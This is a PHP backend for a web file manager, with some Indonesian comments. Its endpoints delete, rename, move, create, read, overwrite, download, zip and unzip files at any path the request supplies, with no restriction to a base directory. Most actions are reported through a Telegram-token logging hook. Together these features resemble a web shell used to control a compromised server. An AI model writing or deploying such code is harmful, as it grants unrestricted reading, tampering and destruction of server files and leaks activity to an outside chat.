<?php

use App\Core\Auth;

if (!Auth::check()) {
    http_response_code(403);
    exit(json_encode(['error' => 'Access Denied']));
}

if ($action === 'api_delete') {

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['success' => false, 'error' => 'Invalid Method']);
        exit;
    }

    $paths = $_POST['paths'] ?? [];
    if (empty($paths) || !is_array($paths)) {
        echo json_encode(['success' => false, 'error' => 'No items selected']);
        exit;
    }

    function delete_recursive($target)
    {
        if (is_dir($target)) {
            $files = glob($target . '/{,.}*', GLOB_BRACE);
            foreach ($files as $file) {
                if (basename($file) == '.' || basename($file) == '..') continue;
                delete_recursive($file);
            }
            return rmdir($target);
        } elseif (is_file($target)) {
            return unlink($target);
        }
        return false;
    }

    $deletedCount = 0;
    $errors = [];

    foreach ($paths as $path) {
        if (file_exists($path)) {
            if (delete_recursive($path)) {
                $deletedCount++;
                if (function_exists('_x_log_activity')) {
                    global $tgToken, $tgChatID;
                    _x_log_activity("Deleted: " . basename($path), $tgToken, $tgChatID);
                }
            } else {
                $errors[] = "Failed to delete: " . basename($path);
            }
        } else {
            $errors[] = "Not found: " . basename($path);
        }
    }

    echo json_encode([
        'success' => true,
        'count' => $deletedCount,
        'errors' => $errors
    ]);
    exit;
}

if ($action === 'api_rename') {

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['success' => false, 'error' => 'Invalid Method']);
        exit;
    }

    $oldPath = $_POST['oldPath'] ?? '';
    $newName = $_POST['newName'] ?? '';

    if (!$oldPath || !$newName) {
        echo json_encode(['success' => false, 'error' => 'Missing parameters']);
        exit;
    }

    if (!file_exists($oldPath)) {
        echo json_encode(['success' => false, 'error' => 'File not found']);
        exit;
    }

    $dir = dirname($oldPath);
    $cleanName = basename($newName);

    if ($cleanName === basename($oldPath)) {
        echo json_encode(['success' => true]); 
        exit;
    }

    $newPath = $dir . DIRECTORY_SEPARATOR . $cleanName;

    if (file_exists($newPath)) {
        echo json_encode(['success' => false, 'error' => 'A file/folder with that name already exists']);
        exit;
    }

    if (rename($oldPath, $newPath)) {
        // Log Activity
        if (function_exists('_x_log_activity')) {
            global $tgToken, $tgChatID;
            _x_log_activity("Renamed: " . basename($oldPath) . " -> $cleanName", $tgToken, $tgChatID);
        }
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Failed to rename. Check permissions.']);
    }
    exit;
}

if ($action === 'api_paste') {
    require_once __DIR__ . '/../app/Helpers/Functions.php';

    $destPath = $_POST['destination'] ?? '';
    $sources = $_POST['sources'] ?? [];
    $mode = $_POST['mode'] ?? 'copy'; // 'copy' or 'cut'

    if (!$destPath || empty($sources)) exit(json_encode(['success' => false, 'error' => 'Missing params']));
    if (!function_exists('delete_recursive_path')) {
        function delete_recursive_path($target)
        {
            if (is_dir($target)) {
                $files = glob($target . '/{,.}*', GLOB_BRACE);
                foreach ($files as $file) {
                    if (basename($file) == '.' || basename($file) == '..') continue;
                    delete_recursive_path($file);
                }
                return rmdir($target);
            } elseif (is_file($target)) {
                return unlink($target);
            }
            return false;
        }
    }

    $count = 0;
    $errors = [];

    foreach ($sources as $source) {
        if (!file_exists($source)) continue;

        $baseName = basename($source);
        $target = $destPath . DIRECTORY_SEPARATOR . $baseName;
        if ($source === $target) continue;
        if (file_exists($target)) {
            $info = pathinfo($target);
            $ext = isset($info['extension']) ? '.' . $info['extension'] : '';
            $name = $info['filename'];
            $i = 1;
            while (file_exists($target)) {
                $target = $info['dirname'] . DIRECTORY_SEPARATOR . $name . " - Copy" . ($i > 0 ? " ($i)" : "") . $ext;
                $i++;
            }
        }

        // --- LOGIC CUT (MOVE) ---
        if ($mode === 'cut') {
            if (@rename($source, $target)) {
                $count++;
            } else {
                if (is_dir($source)) recurse_copy($source, $target);
                else copy($source, $target);
                if (file_exists($target)) {
                    delete_recursive_path($source);
                    $count++;
                } else {
                    $errors[] = "Failed to move: $baseName";
                }
            }
        }
        // --- LOGIC COPY ---
        else {
            if (is_dir($source)) recurse_copy($source, $target);
            else copy($source, $target);
            $count++;
        }
    }

    if (function_exists('_x_log_activity')) {
        global $tgToken, $tgChatID;
        $verb = ($mode === 'cut') ? "Moved" : "Copied";
        _x_log_activity("$verb $count items to " . basename($destPath), $tgToken, $tgChatID);
    }

    echo json_encode(['success' => true, 'count' => $count, 'errors' => $errors]);
    exit;
}

if ($action === 'api_create_folder') {

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['success' => false, 'error' => 'Invalid Method']);
        exit;
    }

    $path = $_POST['path'] ?? '';
    $name = $_POST['name'] ?? '';
    if (!$path || !$name) {
        echo json_encode(['success' => false, 'error' => 'Path or Name is missing']);
        exit;
    }

    $cleanName = basename($name);
    $targetPath = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $cleanName;
    if (file_exists($targetPath)) {
        echo json_encode(['success' => false, 'error' => 'Folder already exists!']);
        exit;
    }
    if (mkdir($targetPath, 0777, true)) {
        if (function_exists('_x_log_activity')) {
            _x_log_activity("Created Folder: $cleanName", $tgToken, $tgChatID);
        }
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Failed to create folder. Check permissions.']);
    }
    exit;
}

if ($action === 'api_create_file') {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['success' => false, 'error' => 'Invalid Method']);
        exit;
    }

    $path = $_POST['path'] ?? '';
    $name = $_POST['name'] ?? '';

    if (!$path || !$name) {
        echo json_encode(['success' => false, 'error' => 'Path or Name is missing']);
        exit;
    }

    $cleanName = basename($name);
    $targetPath = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $cleanName;

    if (file_exists($targetPath)) {
        echo json_encode(['success' => false, 'error' => 'File already exists!']);
        exit;
    }

    if (file_put_contents($targetPath, '') !== false) {
        if (function_exists('_x_log_activity')) {
            _x_log_activity("Created File: $cleanName", $tgToken, $tgChatID);
        }
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Failed to create file. Check permissions.']);
    }
    exit;
}

if ($action === 'api_get_content') {
    // 1. Bersihkan semua output sampah/warning sebelumnya (Wajib!)
    while (ob_get_level()) ob_end_clean();

    // 2. Set Header jadi TEXT biasa (Bukan JSON)
    header('Content-Type: text/plain; charset=utf-8');

    $path = $_REQUEST['path'] ?? '';
    if (empty($path)) {
        die("Error: Path kosong.");
    }

    if (!file_exists($path)) {
        die("Error: File tidak ditemukan: " . htmlspecialchars($path));
    }

    if (is_dir($path)) {
        die("Error: Ini adalah folder, bukan file.");
    }

    if (!is_readable($path)) {
        die("Error: Permission Denied (Tidak bisa baca file).");
    }

    // 4. Cek Ukuran (Limit 5MB biar browser gak nge-lag)
    if (filesize($path) > 5 * 1024 * 1024) {
        die("Error: File terlalu besar (>5MB). Silakan download saja.");
    }

    readfile($path);

    exit;
}

if ($action === 'api_save_content') {
    header('Content-Type: application/json');

    $path = $_POST['path'] ?? '';
    $content = $_POST['content'] ?? '';

    if (!file_exists($path)) {
        echo json_encode(['success' => false, 'error' => 'File not found']);
        exit;
    }

    if (!is_writable($path)) {
        echo json_encode(['success' => false, 'error' => 'Permission Denied (Not Writable)']);
        exit;
    }

    // Tulis konten baru
    $result = @file_put_contents($path, $content);

    if ($result === false) {
        echo json_encode(['success' => false, 'error' => 'Write failed']);
    } else {
        echo json_encode(['success' => true]);
    }
    exit;
}

if ($action === 'download') {
    $path = $_GET['path'] ?? '';
    if (file_exists($path) && is_file($path)) {
        if (function_exists('_x_log_activity')) {
            global $tgToken, $tgChatID;
            _x_log_activity("Downloaded: " . basename($path), $tgToken, $tgChatID);
        }

        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;
    }
    http_response_code(404);
    echo "File not found.";
    exit;
}

if ($action === 'api_zip') {
    if (!extension_loaded('zip')) exit(json_encode(['success' => false, 'error' => 'PHP Zip extension missing']));

    $name = $_POST['name'] ?? 'archive.zip';
    $path = $_POST['path'] ?? ''; // Current Directory
    $items = $_POST['items'] ?? []; // Array of paths to zip

    if (!$path || empty($items)) exit(json_encode(['success' => false, 'error' => 'No items selected']));

    if (substr($name, -4) !== '.zip') $name .= '.zip';

    $zipPath = $path . DIRECTORY_SEPARATOR . $name;

    if (file_exists($zipPath)) exit(json_encode(['success' => false, 'error' => 'File already exists']));

    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE) !== TRUE) {
        exit(json_encode(['success' => false, 'error' => 'Cannot create zip file']));
    }

    // Helper Recursive Add
    $addToZip = function ($source, $zip, $relativePath = '') {
        $source = str_replace('\\', '/', realpath($source));

        if (is_dir($source)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($files as $file) {
                $file = str_replace('\\', '/', $file);
                // Ignore . and ..
                if (in_array(substr($file, strrpos($file, '/') + 1), ['.', '..'])) continue;

                $file = realpath($file);
                if (is_dir($file)) {
                    // Create Empty Dir in Zip
                    // $zip->addEmptyDir(str_replace($source . '/', $relativePath, $file . '/'));
                } else if (is_file($file)) {
                    $localPath = substr($file, strlen($source) + 1);
                    $zipName = $relativePath ? $relativePath . '/' . $localPath : $localPath;
                    $zip->addFile($file, $zipName);
                }
            }
        } elseif (is_file($source)) {
            $zip->addFile($source, basename($source));
        }
    };

    foreach ($items as $item) {
        if (file_exists($item)) {
            $baseName = basename($item);
            if (is_dir($item)) {
                $zip->addEmptyDir($baseName);
                $addToZip($item, $zip, $baseName);
            } else {
                $zip->addFile($item, $baseName);
            }
        }
    }

    $zip->close();

    if (function_exists('_x_log_activity')) {
        global $tgToken, $tgChatID;
        _x_log_activity("Created Zip: $name", $tgToken, $tgChatID);
    }

    echo json_encode(['success' => true]);
    exit;
}

if ($action === 'api_unzip') {
    if (!extension_loaded('zip')) exit(json_encode(['success' => false, 'error' => 'PHP Zip extension missing']));

    $item = $_POST['item'] ?? ''; // Path to zip file
    $dest = $_POST['destination'] ?? ''; // Extract to here

    if (!$item || !file_exists($item)) exit(json_encode(['success' => false, 'error' => 'File not found']));

    $zip = new ZipArchive;
    if ($zip->open($item) === TRUE) {
        $zip->extractTo($dest);
        $zip->close();

        if (function_exists('_x_log_activity')) {
            global $tgToken, $tgChatID;
            _x_log_activity("Extracted: " . basename($item), $tgToken, $tgChatID);
        }
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Failed to open zip']);
    }
    exit;
}
?>